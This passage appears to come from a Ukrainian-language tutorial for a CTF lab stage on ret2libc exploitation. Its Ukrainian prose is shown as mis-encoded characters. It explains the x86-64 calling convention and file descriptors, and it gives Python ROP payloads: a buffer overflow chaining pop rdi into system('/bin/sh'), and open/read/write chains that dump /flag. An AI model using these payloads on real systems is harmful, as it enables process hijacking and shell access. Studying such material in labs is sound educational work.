‚ïë –ö—Ä–æ–∫ 3.2: jmp rip                                             ‚ïë
‚ïë   –ü—Ä–æ—Ü–µ—Å–æ—Ä —Å—Ç—Ä–∏–±–∞—î –Ω–∞ 0x7ffff7a50d70 (–ø–æ—á–∞—Ç–æ–∫ system())       ‚ïë
‚ïë                                                               ‚ïë
‚ïë –°—Ç–µ–∫ –ü–Ü–°–õ–Ø ret:                                               ‚ïë
‚ïë                                 ‚ñº RSP                         ‚ïë
‚ïë ‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê                               ‚ïë
‚ïë ‚îÇ (—â–æ—Å—å –Ω–∏–∂—á–µ)                ‚îÇ 0x7ffe...f98                  ‚ïë
‚ïë ‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò                               ‚ïë
‚ïë                                                               ‚ïë
‚ïë –†–µ–≥—ñ—Å—Ç—Ä–∏:                                                     ‚ïë
‚ïë   RIP = 0x7ffff7a50d70 (–ø–æ—á–∞—Ç–æ–∫ system())                     ‚ïë
‚ïë   RSP = 0x7ffe...f98                                          ‚ïë
‚ïë   RDI = 0x7ffff7b98e1a (–∞–¥—Ä–µ—Å–∞ "/bin/sh") ‚úì                   ‚ïë
‚ïë                                                               ‚ïë
‚ïë CPU –≤—Ö–æ–¥–∏—Ç—å –≤ —Ñ—É–Ω–∫—Ü—ñ—é system –∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–æ–º "/bin/sh"!          ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
                        ‚ñº
‚ïî‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïó
‚ïë –ö–ê–î–† 4: system("/bin/sh") –≤–∏–∫–æ–Ω—É—î—Ç—å—Å—è - SUCCESS!             ‚ïë
‚ï†‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ï£
‚ïë                                                               ‚ïë
‚ïë –§—É–Ω–∫—Ü—ñ—è system:                                               ‚ïë
‚ïë   int system(const char *command)                             ‚ïë
‚ïë   {                                                           ‚ïë
‚ïë       // RDI –º—ñ—Å—Ç–∏—Ç—å command = "/bin/sh"                      ‚ïë
‚ïë       execve("/bin/sh", ...)  // –ó–∞–ø—É—Å–∫–∞—î shell              ‚ïë
‚ïë   }                                                           ‚ïë
‚ïë                                                               ‚ïë
‚ïë –†–µ–∑—É–ª—å—Ç–∞—Ç:                                                    ‚ïë
‚ïë   ‚úì Shell –∑–∞–ø—É—â–µ–Ω–∏–π!                                          ‚ïë
‚ïë   ‚úì –ú–∏ –æ—Ç—Ä–∏–º–∞–ª–∏ —ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—É –∫–æ–º–∞–Ω–¥–Ω—É –æ–±–æ–ª–æ–Ω–∫—É!              ‚ïë
‚ïë   ‚úì –ú–æ–∂–µ–º–æ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –∫–æ–º–∞–Ω–¥–∏: ls, cat flag.txt, etc.        ‚ïë
‚ïö‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïê‚ïù
```

## üéØ Calling Convention x86-64 - –ß–û–ú–£ —Å–∞–º–µ RDI?

–¶–µ —Å—Ç–∞–Ω–¥–∞—Ä—Ç **System V AMD64 ABI** (Application Binary Interface) –¥–ª—è Unix —Å–∏—Å—Ç–µ–º.

### –¢–∞–±–ª–∏—Ü—è –ø–µ—Ä–µ–¥–∞—á—ñ –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤:

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ –ü–∞—Ä–∞–º–µ—Ç—Ä‚îÇ –†–µ–≥—ñ—Å—Ç—Ä   ‚îÇ –ü—Ä–∏–∫–ª–∞–¥ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è                 ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 1-–π     ‚îÇ RDI       ‚îÇ system("/bin/sh")                    ‚îÇ
‚îÇ         ‚îÇ           ‚îÇ        ‚ñ≤ –≤ RDI                        ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 2-–π     ‚îÇ RSI       ‚îÇ open("/flag", O_RDONLY)              ‚îÇ
‚îÇ         ‚îÇ           ‚îÇ      ‚ñ≤        ‚ñ≤                       ‚îÇ
‚îÇ         ‚îÇ           ‚îÇ     RDI      RSI                      ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 3-–π     ‚îÇ RDX       ‚îÇ read(3, buf, 100)                    ‚îÇ
‚îÇ         ‚îÇ           ‚îÇ      ‚ñ≤  ‚ñ≤    ‚ñ≤                        ‚îÇ
‚îÇ         ‚îÇ           ‚îÇ     RDI RSI RDX                       ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 4-–π     ‚îÇ RCX       ‚îÇ (—Ä—ñ–¥–∫–æ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î—Ç—å—Å—è –≤ syscall)   ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 5-–π     ‚îÇ R8        ‚îÇ (—Ä—ñ–¥–∫–æ)                              ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 6-–π     ‚îÇ R9        ‚îÇ (—Ä—ñ–¥–∫–æ)                              ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ 7+      ‚îÇ Stack     ‚îÇ –Ø–∫—â–æ > 6 –ø–∞—Ä–∞–º–µ—Ç—Ä—ñ–≤ ‚Üí –≤ —Å—Ç–µ–∫         ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### –î–µ—Ç–∞–ª—å–Ω—ñ –ø—Ä–∏–∫–ª–∞–¥–∏:

**–ü—Ä–∏–∫–ª–∞–¥ 1: system("/bin/sh")**
```c
system("/bin/sh");
```

**–í –∞—Å–µ–º–±–ª–µ—Ä—ñ:**
```asm
lea    rdi, [rel binsh_string]   ; RDI = –∞–¥—Ä–µ—Å–∞ "/bin/sh"
call   system                     ; –í–∏–∫–ª–∏–∫ system()
```

**–ù–∞—à ROP –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç:**
```python
pop_rdi_ret = 0x00401234  # –ê–¥—Ä–µ—Å–∞ gadget "pop rdi; ret"
binsh = 0x7ffff7b98e1a    # –ê–¥—Ä–µ—Å–∞ "/bin/sh"
system = 0x7ffff7a50d70   # –ê–¥—Ä–µ—Å–∞ system()

payload = b'A'*72 + p64(pop_rdi_ret) + p64(binsh) + p64(system)
```

**–ü—Ä–∏–∫–ª–∞–¥ 2: open("/flag", O_RDONLY)**
```c
int fd = open("/flag", O_RDONLY);  // O_RDONLY = 0
```

**–í –∞—Å–µ–º–±–ª–µ—Ä—ñ:**
```asm
lea    rdi, [rel flag_string]     ; RDI = "/flag"
xor    rsi, rsi                    ; RSI = 0 (O_RDONLY)
call   open
```

**ROP –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç:**
```python
pop_rdi_ret = ...
pop_rsi_ret = ...
flag_str = ...
open_addr = ...

rop_chain = (
    p64(pop_rdi_ret) +
    p64(flag_str) +          # RDI = "/flag"
    p64(pop_rsi_ret) +
    p64(0) +                 # RSI = 0
    p64(open_addr)
)
```

**–ü—Ä–∏–∫–ª–∞–¥ 3: read(3, buf, 100)**
```c
read(3, buf, 100);
```

**–í –∞—Å–µ–º–±–ª–µ—Ä—ñ:**
```asm
mov    rdi, 3                      ; RDI = 3 (file descriptor)
lea    rsi, [rbp-0x100]            ; RSI = –∞–¥—Ä–µ—Å–∞ buf
mov    rdx, 100                    ; RDX = 100 (—Ä–æ–∑–º—ñ—Ä)
call   read
```

**ROP –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç –ø–æ—Ç—Ä–µ–±—É—î 3 gadget'–∏:**
```python
pop_rdi_ret = ...
pop_rsi_ret = ...
pop_rdx_ret = ...
buf_addr = ...
read_addr = ...

rop_chain = (
    p64(pop_rdi_ret) +
    p64(3) +                 # RDI = fd
    p64(pop_rsi_ret) +
    p64(buf_addr) +          # RSI = buffer
    p64(pop_rdx_ret) +
    p64(100) +               # RDX = size
    p64(read_addr)
)
```

## üî¢ File Descriptors - —á–æ–º—É fd=3?

**–ö–û–ñ–ï–ù –ø—Ä–æ—Ü–µ—Å** –≤ Linux –º–∞—î —Ç–∞–±–ª–∏—Ü—é –≤—ñ–¥–∫—Ä–∏—Ç–∏—Ö —Ñ–∞–π–ª—ñ–≤ (file descriptor table):

```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  FD  ‚îÇ –ü—Ä–∏–∑–Ω–∞—á–µ–Ω–Ω—è                                    ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  0   ‚îÇ stdin  (standard input - –∫–ª–∞–≤—ñ–∞—Ç—É—Ä–∞/pipe)      ‚îÇ
‚îÇ      ‚îÇ read(0, buf, N)  ‚Üí —á–∏—Ç–∞—î –∑—ñ stdin              ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  1   ‚îÇ stdout (standard output - –µ–∫—Ä–∞–Ω/—Ñ–∞–π–ª)          ‚îÇ
‚îÇ      ‚îÇ write(1, buf, N) ‚Üí –ø–∏—à–µ –≤ stdout               ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  2   ‚îÇ stderr (standard error - –ø–æ–º–∏–ª–∫–∏, —Ç–µ–∂ –µ–∫—Ä–∞–Ω)   ‚îÇ
‚îÇ      ‚îÇ write(2, buf, N) ‚Üí –ø–∏—à–µ –ø–æ–º–∏–ª–∫–∏                ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  3   ‚îÇ (–≤—ñ–ª—å–Ω–æ) ‚Üê –ü–µ—Ä—à–∏–π —Ñ–∞–π–ª —â–æ –ú–ò –≤—ñ–¥–∫—Ä–∏—î–º–æ         ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  4   ‚îÇ (–≤—ñ–ª—å–Ω–æ) ‚Üê –î—Ä—É–≥–∏–π —Ñ–∞–π–ª                         ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ  5   ‚îÇ (–≤—ñ–ª—å–Ω–æ) ‚Üê –¢—Ä–µ—Ç—ñ–π —Ñ–∞–π–ª                         ‚îÇ
‚îú‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îº‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î§
‚îÇ ...  ‚îÇ ...                                            ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

### –ü—Ä–∏–∫–ª–∞–¥ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è ORW:

**–ö—Ä–æ–∫ 1: open("/flag", O_RDONLY)**
```c
int fd = open("/flag", O_RDONLY);
// –ü–æ–≤–µ—Ä—Ç–∞—î 3 (–ø–µ—Ä—à–∏–π –≤—ñ–ª—å–Ω–∏–π FD)
```

**–°—Ç–∞–Ω –ø—ñ—Å–ª—è open:**
```
‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¨‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê
‚îÇ  0   ‚îÇ stdin                              ‚îÇ
‚îÇ  1   ‚îÇ stdout                             ‚îÇ
‚îÇ  2   ‚îÇ stderr                             ‚îÇ
‚îÇ  3   ‚îÇ /flag (–Ω–∞—à —Ñ–∞–π–ª!) ‚Üê –û–°–¨ –¢–£–¢       ‚îÇ
‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚î¥‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò
```

**–ö—Ä–æ–∫ 2: read(3, buf, 100)**
```c
read(3, buf, 100);
// –ß–∏—Ç–∞—î –ó –§–ê–ô–õ–£ /flag (–±–æ fd=3 –≤–∫–∞–∑—É—î –Ω–∞ –Ω—å–æ–≥–æ)
```

**–ö—Ä–æ–∫ 3: write(1, buf, 100)**
```c
write(1, buf, 100);
// –ü–∏—à–µ –Ω–∞ –ï–ö–†–ê–ù (–±–æ fd=1 = stdout)
```

### –©–æ —è–∫—â–æ –≤ –ø—Ä–æ–≥—Ä–∞–º—ñ –≤–∂–µ –≤—ñ–¥–∫—Ä–∏—Ç—ñ —Ñ–∞–π–ª–∏?

**–ü—Ä–∏–∫–ª–∞–¥:**
```c
// –ü—Ä–æ–≥—Ä–∞–º–∞ –≤–∂–µ –≤—ñ–¥–∫—Ä–∏–ª–∞ –ª–æ–≥–∏:
int log_fd = open("/var/log/app.log", O_WRONLY);  // fd = 3
int db_fd = open("/var/db/data.db", O_RDONLY);    // fd = 4

// –¢–µ–ø–µ—Ä –ú–ò –≤—ñ–¥–∫—Ä–∏–≤–∞—î–º–æ:
int flag_fd = open("/flag", O_RDONLY);             // fd = 5!
```

**–¢–æ–¥—ñ –≤ ROP —Ç—Ä–µ–±–∞:**
```python
rop.read(5, buf, 100)  # –ù–µ 3, –∞ 5!
```

**–Ø–∫ –¥—ñ–∑–Ω–∞—Ç–∏—Å—å —è–∫–∏–π FD –±—É–¥–µ?**
1. **–î–µ–±–∞–≥ –≤ GDB** - –ø–æ–¥–∏–≤–∏—Ç–∏—Å—å `/proc/PID/fd`
2. **Brute-force** - —Å–ø—Ä–æ–±—É–≤–∞—Ç–∏ fd=3,4,5,6...
3. **–ê–Ω–∞–ª—ñ–∑ –∫–æ–¥—É** - –ø–æ–¥–∏–≤–∏—Ç–∏—Å—å —á–∏ –ø—Ä–æ–≥—Ä–∞–º–∞ –≤—ñ–¥–∫—Ä–∏–≤–∞—î —Ñ–∞–π–ª–∏

## üöÄ –ü–æ–∫—Ä–æ–∫–æ–≤–µ —Ä—ñ—à–µ–Ω–Ω—è

### –ö—Ä–æ–∫ 1: –ó–±—É–¥—É–π—Ç–µ –±—ñ–Ω–∞—Ä–Ω–∏–∫

```bash
cd stage08_ret2libc
./build.sh
```

–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∑–∞—Ö–∏—Å—Ç–∏:
```bash
checksec --file=../build/stage08_ret2libc
```

–û—á—ñ–∫—É—î—Ç—å—Å—è:
```
RELRO:        Partial RELRO
Stack:        No canary found
NX:           NX enabled     ‚Üê –í–∞–∂–ª–∏–≤–æ!
PIE:          No PIE
```

### –ö—Ä–æ–∫ 2: –ü—ñ–¥–≥–æ—Ç–æ–≤–∫–∞ - –≤–∏—Ç—è–≥ libc

